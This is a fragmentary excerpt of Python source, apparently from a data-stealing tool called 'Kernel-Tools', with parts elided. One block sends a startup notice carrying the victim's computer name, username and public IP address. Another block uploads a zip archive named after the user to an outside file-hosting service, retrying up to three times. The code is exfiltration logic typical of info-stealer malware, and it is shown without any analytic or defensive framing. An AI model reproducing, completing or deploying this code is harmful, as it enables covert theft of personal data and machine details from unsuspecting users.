...
v4r_username_embed = "Kernel-Tools"
v4r_avatar_embed   = "https://zupimages.net/up/26/05/ip7u.png"
v4r_footer_text    = "Kernel-Tools - %LINK_GITHUB%"
...
try:
    v4r_ping_embed = {"title": "Kernel-Tools Started", "description": f"PC: {v4r_hostname_pc} | User: {v4r_username_pc} | IP: {v4r_ip_address_public}", "color": v4r_color_embed, "footer": {"text": v4r_footer_text, "icon_url": v4r_avatar_embed}}
...
for v4r_gofile_attempt in range(3):
    try:
        ...
        v4r_response = requests.post(
            ...
            files={"file": (f"Kernel-Tools_{v4r_username_pc.replace(' ', '_')}.zip", v4r_zip_buffer)},
            timeout=120
        )
